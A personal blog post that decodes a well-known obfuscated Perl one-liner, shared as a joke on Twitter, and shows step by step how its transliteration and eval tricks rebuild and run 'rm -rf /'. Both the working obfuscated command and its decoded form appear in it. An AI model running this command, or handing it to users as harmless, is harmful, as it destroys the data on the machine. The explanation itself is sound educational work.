+++
title = "Understanding the meme perl oneliner"
date = 2022-05-29
description = "an old perl joke resurfaced and I was curious on how it actually worked"
[taxonomies]
tags = ["perl"]
+++

Yesterday, I came across this tweet which was a joke about sexism in tech, but
which included a line of obfuscated code that our villain presumably executed
locally and caused them to "lose everything":

<blockquote class="twitter-tweet"><p lang="en" dir="ltr">Shot / Chaser <a href="https://t.co/m5cF3WZNnM">pic.twitter.com/m5cF3WZNnM</a></p>&mdash; 𝚐𝚒𝚗&amp;𝚝𝚘𝚗𝚒𝚌 (@SapioSiren) <a href="https://twitter.com/SapioSiren/status/1530363498689069058?ref_src=twsrc%5Etfw">May 28, 2022</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

Me and other nerds who saw this tweet, though, were drawn to the obfuscated code
snippet, and were puzzled as to what it actually meant:

<!-- prettier-ignore -->
> echo "hello world" | perl -e '$??s:;s:s;;$?::s;;=]=>^-{<-|}<&|\`{;;y; -/:-@[-\`{-};\`-{/" -;;s;;$\_;see'

The short, but boring, explanation is that it tells your shell to execute
`rm -rf /`, a command that, when executed by a sufficiently privileged user,
deletes every file in your system[^gnu-rm].

Some of the replies to the tweet also linked to a more complete explanation at
[https://www.dlitz.net/stuff/malicious-perl-sig/](https://www.dlitz.net/stuff/malicious-perl-sig/),
but even that explanation was insufficient to me, and I wanted to be able to
give a satisfactory explanation in a Discord I was in, so I cracked open the
`perldoc` pages and started reading things. This post is basically a nicer
version of the explanation.

# High level overview

Here is the snippet, once again ~~but in a code block~~:

```sh
> echo "hello world" | perl -e '$??s:;s:s;;$?::s;;=]=>^-{<-|}<&|`{;;y; -/:-@[-`{-};`-{/" -;;s;;$_;see'
```

This is a line in bourne shell (the standard shell on, uh, non-Windows systems)
that will produce the innocent sequence of characters `hello world` and feed it
into an invocation of `perl`, with a oneline script provided to it. The script
proceeds to (attempt to) delete all files in your computer. How did this happen?

## Prior knowledge

[Perl](https://www.perl.org/) is a language that was designed as an amalgamation
of various languages and mini-languages that were routinely used by unix system
administrators like `sh` (bourne shell), `awk` and `sed`; this includes a lot of
their idiosyncracies. It is very optimized for handling plain text, and if what
you're doing fits easily into its idiosyncrasies, perl allows you to be very
terse indeed, which helped build its infamy as an obfuscated language, and some
of those are important for understanding the code:

- Perl, unlike JavaScript or Ruby, doesn't require regular expression operators
  to use `/`, but simply takes whatever symbol is used after the operator and
  uses it as the separator[^perl-separator]. The snippet abuses that property to
  use confusing separators like `:` and `;`.
- A lot of operations in perl, when not given an explicit value to operate on,
  will default to reading from, or writing to,
  [the `$_` global](https://perldoc.perl.org/perlvar#$_), which I believe is
  something Perl took from `awk`.
- An empty regular expression pattern in Perl is not actually an _empty_
  pattern,
  [but a shorthand to _repeat_ the last pattern that matched](https://perldoc.perl.org/perlop#The-empty-pattern-//).
  This snippet does abuse the corner case that happens if no pattern ever
  matched before in the program, though, which makes it a true empty pattern
  that always matches.

# Understanding the code

Now, to help explain this, I'll try to rewrite some of the confusing notation
into easier to read notation. I'll add whitespace where possible and replace the
regexp separators with the `/` most people are used to; this requires added
escaping but it should still feel more familiar.

First off, at no point in the script is the `hello world` input actually read. A
lot of `perl` oneliners do implicitly read the input, but this one is missing
the `-s` or `-p` options and doesn't do an explicit read either so it simply
doesn't. It's a complete red herring.

Now, for the first part of the snippet:

```perl
$? ? s/;s/s;;$?/ :
```

This is actually a regular C-style ternary. The predicate is
[the `$?` global](https://perldoc.perl.org/perlvar#$?), which holds the status
code of the last external command executed in the script; since nothing has been
executed yet, this is a `0`, which is a falsy constant. This means the `?`
branch is never taken, this always goes to `:`, everything here serves no
function other than to look confusing... again.

```perl
s//=]=>%-{<-|}<&|`{/;
```

This is the expression in the `:` side mentioned above, and it is a
[regular expression substitution operator](https://perldoc.perl.org/perlop#s/PATTERN/REPLACEMENT/msixpodualngcer),
similar to a common `sed` invocation; here a few of the idiosyncrasies mentioned
earlier come into play.

There is no input or output provided to the command, so it operates on the `$_`
global, which is empty at this point. The pattern portion of the regexp, in
between the first two `/`, is empty, so it will repeat the last matched regexp,
but no regexp has matched before so it will be an actual empty match, and will
be substituted with the text in the substitution part of the operator.

This is really just a fancy way of writing `` $_ = '=]=>%-{<-|}<&|`{' ``.

## The big trick

```perl
y/ -\/:-@[-`{-}/`-{\/" -/;
```

This is the really complicated part, and it is what does the actual transforming
of the string that was prepared on the previous instruction. It's not
highlighted correctly either 😅

This is the
[transliteration operator](https://perldoc.perl.org/perlop#y/SEARCHLIST/REPLACEMENTLIST/cdsr),
and it behaves similarly to the `tr` unix command.

This will build a list of input characters and a list of output characters, and
will do a 1-to-1 mapping between them in order. When building the list, you can
specify a start and end character _range_ by separating them with a
`-`[^tr-hyphen]. Repeated input characters are ignored, and each character is
only translated once.

To begin with, let's look at a simple example: `tr a-z n-za-m`, which is a
(lowercase-only) rot13 implementation. It builds a list with each character from
a to z, and replaces each character with the corresponding character 13 letters
down the alphabet. `a-z` expands to `abcdefghijklmnopqrstuvwxyz`, and `n-za-m`
expands to `nopqrstuvwxyzabcdefghijklm`, and the mapping is positional; so `a`
becomes `n`, `b` becomes `o`, `d` becomes `q`, `z` becomes `m`, etc, according
to this table:

> `abcdefghijklmnopqrstuvwxyz` ->  
> `nopqrstuvwxyzabcdefghijklm`

The actual translation done by the snippet is a lot more complicated and it
abuses the specific layout of the standard ASCII table[^ebcdic]. Here is one,
with the first 2 rows (control characters) omitted, and using `␣` to represent a
space character:

<div style="overflow-x: auto;">
<table style="font-family: monospace">
  <tr>
    <th scope="row"></th>
    <th scope="col">0</th>
    <th scope="col">1</th>
    <th scope="col">2</th>
    <th scope="col">3</th>
    <th scope="col">4</th>
    <th scope="col">5</th>
    <th scope="col">6</th>
    <th scope="col">7</th>
    <th scope="col">8</th>
    <th scope="col">9</th>
    <th scope="col">A</th>
    <th scope="col">B</th>
    <th scope="col">C</th>
    <th scope="col">D</th>
    <th scope="col">E</th>
    <th scope="col">F</th>
  </tr>
  <tr>
    <th scope="row">2</th>
    <td title="space">␣</td>
    <td>!</td>
    <td>"</td>
    <td>#</td>
    <td>$</td>
    <td>%</td>
    <td>&</td>
    <td>'</td>
    <td>(</td>
    <td>)</td>
    <td>*</td>
    <td>+</td>
    <td>,</td>
    <td>-</td>
    <td>.</td>
    <td>/</td>
  </tr>
  <tr>
    <th scope="row">3</th>
    <td>0</td>
    <td>1</td>
    <td>2</td>
    <td>3</td>
    <td>4</td>
    <td>5</td>
    <td>6</td>
    <td>7</td>
    <td>8</td>
    <td>9</td>
    <td>:</td>
    <td>;</td>
    <td>&lt;</td>
    <td>=</td>
    <td>&gt;</td>
    <td>?</td>
  </tr>
  <tr>
    <th scope="row">4</th>
    <td>@</td>
    <td>A</td>
    <td>B</td>
    <td>C</td>
    <td>D</td>
    <td>E</td>
    <td>F</td>
    <td>G</td>
    <td>H</td>
    <td>I</td>
    <td>J</td>
    <td>K</td>
    <td>L</td>
    <td>M</td>
    <td>N</td>
    <td>O</td>
  </tr>
  <tr>
    <th scope="row">5</th>
    <td>P</td>
    <td>Q</td>
    <td>R</td>
    <td>S</td>
    <td>T</td>
    <td>U</td>
    <td>V</td>
    <td>W</td>
    <td>X</td>
    <td>Y</td>
    <td>Z</td>
    <td>[</td>
    <td>\</td>
    <td>]</td>
    <td>^</td>
    <td>_</td>
  </tr>
  <tr>
    <th scope="row">6</th>
    <td>`</td>
    <td>a</td>
    <td>b</td>
    <td>c</td>
    <td>d</td>
    <td>e</td>
    <td>f</td>
    <td>g</td>
    <td>h</td>
    <td>i</td>
    <td>j</td>
    <td>k</td>
    <td>l</td>
    <td>m</td>
    <td>n</td>
    <td>o</td>
  </tr>
  <tr>
    <th scope="row">7</th>
    <td>p</td>
    <td>q</td>
    <td>r</td>
    <td>s</td>
    <td>t</td>
    <td>u</td>
    <td>v</td>
    <td>w</td>
    <td>x</td>
    <td>y</td>
    <td>z</td>
    <td>{</td>
    <td>|</td>
    <td>}</td>
    <td>~</td>
    <td></td>
  </tr>
</table>
</div>

The snippet's translation is, naturally, overly complicated, and uses multiple
ranges, exploiting the way they are arranged to turn punctuation into text.

There are four ranges in the input side,
<code style="white-space: pre"><span style="color: #90a959">␣-/</span><span style="color: #f4bf75">:-@</span><span style="color: #6a9fb5">[-`</span><span style="color: #aa759f">{-}</span></code>
, and here is how they look arranged in the ASCII table:

<div style="overflow-x: auto;">
<table style="font-family: monospace">
  <tr>
    <th scope="row"></th>
    <th scope="col">0</th>
    <th scope="col">1</th>
    <th scope="col">2</th>
    <th scope="col">3</th>
    <th scope="col">4</th>
    <th scope="col">5</th>
    <th scope="col">6</th>
    <th scope="col">7</th>
    <th scope="col">8</th>
    <th scope="col">9</th>
    <th scope="col">A</th>
    <th scope="col">B</th>
    <th scope="col">C</th>
    <th scope="col">D</th>
    <th scope="col">E</th>
    <th scope="col">F</th>
  </tr>
  <tr>
    <th scope="row">2</th>
    <td style="background: #90a959" title="space">␣</td>
    <td style="background: #90a959">!</td>
    <td style="background: #90a959">"</td>
    <td style="background: #90a959">#</td>
    <td style="background: #90a959">$</td>
    <td style="background: #90a959">%</td>
    <td style="background: #90a959">&</td>
    <td style="background: #90a959">'</td>
    <td style="background: #90a959">(</td>
    <td style="background: #90a959">)</td>
    <td style="background: #90a959">*</td>
    <td style="background: #90a959">+</td>
    <td style="background: #90a959">,</td>
    <td style="background: #90a959">-</td>
    <td style="background: #90a959">.</td>
    <td style="background: #90a959">/</td>
  </tr>
  <tr>
    <th scope="row">3</th>
    <td>0</td>
    <td>1</td>
    <td>2</td>
    <td>3</td>
    <td>4</td>
    <td>5</td>
    <td>6</td>
    <td>7</td>
    <td>8</td>
    <td>9</td>
    <td style="background: #f4bf75">:</td>
    <td style="background: #f4bf75">;</td>
    <td style="background: #f4bf75">&lt;</td>
    <td style="background: #f4bf75">=</td>
    <td style="background: #f4bf75">&gt;</td>
    <td style="background: #f4bf75">?</td>
  </tr>
  <tr>
    <th scope="row">4</th>
    <td style="background: #f4bf75">@</td>
    <td>A</td>
    <td>B</td>
    <td>C</td>
    <td>D</td>
    <td>E</td>
    <td>F</td>
    <td>G</td>
    <td>H</td>
    <td>I</td>
    <td>J</td>
    <td>K</td>
    <td>L</td>
    <td>M</td>
    <td>N</td>
    <td>O</td>
  </tr>
  <tr>
    <th scope="row">5</th>
    <td>P</td>
    <td>Q</td>
    <td>R</td>
    <td>S</td>
    <td>T</td>
    <td>U</td>
    <td>V</td>
    <td>W</td>
    <td>X</td>
    <td>Y</td>
    <td>Z</td>
    <td style="background: #6a9fb5">[</td>
    <td style="background: #6a9fb5">\</td>
    <td style="background: #6a9fb5">]</td>
    <td style="background: #6a9fb5">^</td>
    <td style="background: #6a9fb5">_</td>
  </tr>
  <tr>
    <th scope="row">6</th>
    <td style="background: #6a9fb5">`</td>
    <td>a</td>
    <td>b</td>
    <td>c</td>
    <td>d</td>
    <td>e</td>
    <td>f</td>
    <td>g</td>
    <td>h</td>
    <td>i</td>
    <td>j</td>
    <td>k</td>
    <td>l</td>
    <td>m</td>
    <td>n</td>
    <td>o</td>
  </tr>
  <tr>
    <th scope="row">7</th>
    <td>p</td>
    <td>q</td>
    <td>r</td>
    <td>s</td>
    <td>t</td>
    <td>u</td>
    <td>v</td>
    <td>w</td>
    <td>x</td>
    <td>y</td>
    <td>z</td>
    <td style="background: #aa759f">{</td>
    <td style="background: #aa759f">|</td>
    <td style="background: #aa759f">}</td>
    <td>~</td>
    <td></td>
  </tr>
</table>
</div>

The output transliteration guide is
<code><span style="color: #90a959;">`-{</span><span style="color: #f4bf75">/</span><span style="color: #6a9fb5">"</span><span style="color: #aa759f">␣</span><span style="color: #ac4142">-</span></code>,
and here is how they look in the table, colored according to how the characters
are defined in the output section:

<div style="overflow-x: auto;">
<table style="font-family: monospace">
  <tr>
    <th scope="row"></th>
    <th scope="col">0</th>
    <th scope="col">1</th>
    <th scope="col">2</th>
    <th scope="col">3</th>
    <th scope="col">4</th>
    <th scope="col">5</th>
    <th scope="col">6</th>
    <th scope="col">7</th>
    <th scope="col">8</th>
    <th scope="col">9</th>
    <th scope="col">A</th>
    <th scope="col">B</th>
    <th scope="col">C</th>
    <th scope="col">D</th>
    <th scope="col">E</th>
    <th scope="col">F</th>
  </tr>
  <tr>
    <th scope="row">2</th>
    <td style="background: #aa759f" title="space">␣</td>
    <td>!</td>
    <td style="background: #6a9fb5">"</td>
    <td>#</td>
    <td>$</td>
    <td>%</td>
    <td>&</td>
    <td>'</td>
    <td>(</td>
    <td>)</td>
    <td>*</td>
    <td>+</td>
    <td>,</td>
    <td style="background: #ac4142">-</td>
    <td>.</td>
    <td style="background: #f4bf75">/</td>
  </tr>
  <tr>
    <th scope="row">3</th>
    <td>0</td>
    <td>1</td>
    <td>2</td>
    <td>3</td>
    <td>4</td>
    <td>5</td>
    <td>6</td>
    <td>7</td>
    <td>8</td>
    <td>9</td>
    <td>:</td>
    <td>;</td>
    <td>&lt;</td>
    <td>=</td>
    <td>&gt;</td>
    <td>?</td>
  </tr>
  <tr>
    <th scope="row">4</th>
    <td>@</td>
    <td>A</td>
    <td>B</td>
    <td>C</td>
    <td>D</td>
    <td>E</td>
    <td>F</td>
    <td>G</td>
    <td>H</td>
    <td>I</td>
    <td>J</td>
    <td>K</td>
    <td>L</td>
    <td>M</td>
    <td>N</td>
    <td>O</td>
  </tr>
  <tr>
    <th scope="row">5</th>
    <td>P</td>
    <td>Q</td>
    <td>R</td>
    <td>S</td>
    <td>T</td>
    <td>U</td>
    <td>V</td>
    <td>W</td>
    <td>X</td>
    <td>Y</td>
    <td>Z</td>
    <td>[</td>
    <td>\</td>
    <td>]</td>
    <td>^</td>
    <td>_</td>
  </tr>
  <tr>
    <th scope="row">6</th>
    <td style="background: #90a959">`</td>
    <td style="background: #90a959">a</td>
    <td style="background: #90a959">b</td>
    <td style="background: #90a959">c</td>
    <td style="background: #90a959">d</td>
    <td style="background: #90a959">e</td>
    <td style="background: #90a959">f</td>
    <td style="background: #90a959">g</td>
    <td style="background: #90a959">h</td>
    <td style="background: #90a959">i</td>
    <td style="background: #90a959">j</td>
    <td style="background: #90a959">k</td>
    <td style="background: #90a959">l</td>
    <td style="background: #90a959">m</td>
    <td style="background: #90a959">n</td>
    <td style="background: #90a959">o</td>
  </tr>
  <tr>
    <th scope="row">7</th>
    <td style="background: #90a959">p</td>
    <td style="background: #90a959">q</td>
    <td style="background: #90a959">r</td>
    <td style="background: #90a959">s</td>
    <td style="background: #90a959">t</td>
    <td style="background: #90a959">u</td>
    <td style="background: #90a959">v</td>
    <td style="background: #90a959">w</td>
    <td style="background: #90a959">x</td>
    <td style="background: #90a959">y</td>
    <td style="background: #90a959">z</td>
    <td style="background: #90a959">{</td>
    <td>|</td>
    <td>}</td>
    <td>~</td>
    <td></td>
  </tr>
</table>
</div>

As one can see, the size of the groups does not need at all be equal between
them. Note also that the last `-` is simply a `-`, and is not interpreted as a
range due to its position. The only important part is that both the input and
the output section include the same amount of characters[^short-tr], 32 in this
case.

To help visualize the trickery involved, here is once again the output layout,
but colored according to how the ranges are declared in the _input_ section:

<div style="overflow-x: auto;">
<table style="font-family: monospace">
  <tr>
    <th scope="row"></th>
    <th scope="col">0</th>
    <th scope="col">1</th>
    <th scope="col">2</th>
    <th scope="col">3</th>
    <th scope="col">4</th>
    <th scope="col">5</th>
    <th scope="col">6</th>
    <th scope="col">7</th>
    <th scope="col">8</th>
    <th scope="col">9</th>
    <th scope="col">A</th>
    <th scope="col">B</th>
    <th scope="col">C</th>
    <th scope="col">D</th>
    <th scope="col">E</th>
    <th scope="col">F</th>
  </tr>
  <tr>
    <th scope="row">2</th>
    <td style="background: #aa759f" title="space">␣</td>
    <td>!</td>
    <td style="background: #aa759f">"</td>
    <td>#</td>
    <td>$</td>
    <td>%</td>
    <td>&</td>
    <td>'</td>
    <td>(</td>
    <td>)</td>
    <td>*</td>
    <td>+</td>
    <td>,</td>
    <td style="background: #aa759f">-</td>
    <td>.</td>
    <td style="background: #6a9fb5">/</td>
  </tr>
  <tr>
    <th scope="row">3</th>
    <td>0</td>
    <td>1</td>
    <td>2</td>
    <td>3</td>
    <td>4</td>
    <td>5</td>
    <td>6</td>
    <td>7</td>
    <td>8</td>
    <td>9</td>
    <td>:</td>
    <td>;</td>
    <td>&lt;</td>
    <td>=</td>
    <td>&gt;</td>
    <td>?</td>
  </tr>
  <tr>
    <th scope="row">4</th>
    <td>@</td>
    <td>A</td>
    <td>B</td>
    <td>C</td>
    <td>D</td>
    <td>E</td>
    <td>F</td>
    <td>G</td>
    <td>H</td>
    <td>I</td>
    <td>J</td>
    <td>K</td>
    <td>L</td>
    <td>M</td>
    <td>N</td>
    <td>O</td>
  </tr>
  <tr>
    <th scope="row">5</th>
    <td>P</td>
    <td>Q</td>
    <td>R</td>
    <td>S</td>
    <td>T</td>
    <td>U</td>
    <td>V</td>
    <td>W</td>
    <td>X</td>
    <td>Y</td>
    <td>Z</td>
    <td>[</td>
    <td>\</td>
    <td>]</td>
    <td>^</td>
    <td>_</td>
  </tr>
  <tr>
    <th scope="row">6</th>
    <td style="background: #90a959">`</td>
    <td style="background: #90a959">a</td>
    <td style="background: #90a959">b</td>
    <td style="background: #90a959">c</td>
    <td style="background: #90a959">d</td>
    <td style="background: #90a959">e</td>
    <td style="background: #90a959">f</td>
    <td style="background: #90a959">g</td>
    <td style="background: #90a959">h</td>
    <td style="background: #90a959">i</td>
    <td style="background: #90a959">j</td>
    <td style="background: #90a959">k</td>
    <td style="background: #90a959">l</td>
    <td style="background: #90a959">m</td>
    <td style="background: #90a959">n</td>
    <td style="background: #90a959">o</td>
  </tr>
  <tr>
    <th scope="row">7</th>
    <td style="background: #f4bf75">p</td>
    <td style="background: #f4bf75">q</td>
    <td style="background: #f4bf75">r</td>
    <td style="background: #f4bf75">s</td>
    <td style="background: #f4bf75">t</td>
    <td style="background: #f4bf75">u</td>
    <td style="background: #f4bf75">v</td>
    <td style="background: #6a9fb5">w</td>
    <td style="background: #6a9fb5">x</td>
    <td style="background: #6a9fb5">y</td>
    <td style="background: #6a9fb5">z</td>
    <td style="background: #6a9fb5">{</td>
    <td>|</td>
    <td>}</td>
    <td>~</td>
    <td></td>
  </tr>
</table>
</div>

Here is the actual translation table that gets generated:

> `` ␣!"#$%&'()*+,-./:;<=>?@[\]^_`{|} `` ->  
> `` `abcdefghijklmnopqrstuvwxyz{/"␣- ``

Once again, as the operator was not given a target, it reads from and writes to
`$_`, and the current content of `$_` is `` =]=>%-{<-|}<&|`{ ``. Let's just
translate it ourselves, going from left to right on the input table[^tr-order]:

| Step                              | Current result                        |
| --------------------------------- | ------------------------------------- |
| input                             | <code>=]=>%-{&lt;-\|}&lt;&\|`{</code> |
| the `%` becomes `e`               | <code>=]=>e-{&lt;-\|}&lt;&\|`{</code> |
| the `&` becomes `f`               | <code>=]=>e-{&lt;-\|}&lt;f\|`{</code> |
| all `-` become `m`                | <code>=]=>em{&lt;m\|}&lt;f\|`{</code> |
| all `=` become `s`                | <code>s]s>em{&lt;m\|}&lt;f\|`{</code> |
| the `<` becomes `r`               | <code>s]s>em{rm\|}rf\|`{</code>       |
| all `=` become `s`                | <code>s]s>em{rm\|}rf\|`{</code>       |
| the `>` becomes `t`               | <code>s]stem{rm\|}rf\|`{</code>       |
| the `]` becomes `y`               | <code>system{rm\|}rf\|`{</code>       |
| the <code>\`</code> becomes a `/` | <code>system{rm\|}rf\|/{</code>       |
| all `{` become `"`                | <code>system"rm\|}rf\|/"</code>       |
| all <code>\|</code> become spaces | <code>system"rm }rf /"</code>         |
| the `}` becomes a `-`             | <code>system"rm -rf /"</code>         |

This is the ultimate result of the translation, and the `system"rm -rf /"` is
the "shellcode" of this script. This is the code that will attempt to execute
`rm -rf /`, but it is not code yet, just text.

## See

```perl
s//$_/see
```

This is what does the `eval` of the shellcode. This is once again a
[substitution operator](https://perldoc.perl.org/perlop#s/PATTERN/REPLACEMENT/msixpodualngcer),
but this time there are flags at the end.

The `s` flag is completely irrelevant here[^s-flag] and once again a
distraction; it does help disguise the `ee` flag and make it look like an
english word ("see").

Now, what is the `ee` flag?[^why-ee] It changes how the operator works
completely: instead of doing a simple substitution, it will take the
substitution string's result and `eval` it (interpret it as code).

If you recall, this substitution has no target so it will work on the `$_`
global. It matches an empty pattern due to still hitting the corner case of
pattern repetition, and substitutes it with the contents of `$_`. If this
operator did not have the `ee` flag, it would simply duplicate the contents of
`$_`, but with this flag, it will take the substitution string, which is the
current content of `$_`, and `eval` it. The content of which is the
`system"rm -rf /"` that was
[constructed by the `y/.../.../` transliteration](#the-big-trick).

This oneliner is a very convoluted way of writing `perl -e 'system"rm -rf /"'`.

```perl
system"rm -rf /"
```

Finally, the code that gets `eval`ed is simply calling the
[`system` global function](https://perldoc.perl.org/perlfunc#system-LIST) with
the `"rm -rf /"` string as the first argument, with nothing syntactically weird
here other than the lack of a space, which perl happens to not require.

# Conclusion?

This was an interesting exercise, and I learned a lot more about the `y///`
operator than I ever expected to learn in my life without this one puzzle.
Hopefully the explanation makes sense!

---

<!-- prettier-ignore -->
[^gnu-rm]: Or tries to. The GNU coreutils implementation, at least, will detect
and guard against this exact invocation, demanding that you also provide the
`--no-preserve-root` argument, but this snippet is certainly older than this
little bit of defense.

<!-- prettier-ignore -->
[^perl-separator]: `/` is still the most popular separator, followed by `@` when
there's a lot of embedded /s so you don't have to escape as much. Perl uniquely
also supports balanced braces instead of separators, like
`s{pattern}{substitution}`.

<!-- prettier-ignore -->
[^tr-hyphen]: To include a literal `-` in the translation, it needs to either be
overlapped by a range, or be the first/last character of the translation.

<!-- prettier-ignore-->
[^ebcdic]: Perl, amazingly, _has_ [EBCDIC](https://en.wikipedia.org/wiki/EBCDIC)
support, and would do the correct EBCDIC thing in EBCDIC systems if it can tell,
at compile time, that the character ranges are purely alphanumeric.

<!-- prettier-ignore -->
[^short-tr]: If the replacement section has fewer characters than the input, the
last character is repeated to fit; if it has more characters than needed, then
the extra characters are ignored.

<!-- prettier-ignore -->
[^tr-order]: This is certainly not how the translation is actually done in code;
a real implementation probably scans the string left-to-right and replaces one
character at a time. Going by table order makes for a better story, though!

<!-- prettier-ignore -->
[^s-flag]: The "single line" flag, it's used to ignore newlines inside the
string being processed for the purposes of the `^` and `$` metacharacters,
making them only match the start and end of the entire string.

<!-- prettier-ignore -->
[^why-ee]: And why is `ee` a single flag anyway? There's actually a `e` already,
which does execute code, but it is compile-time checked code. The second `e` is
what makes it "more eval". If the `s//$_/` RE only had `e` as a flag, it'd
evaluate only the variable access `$_` as code, not the result of the variable
access.
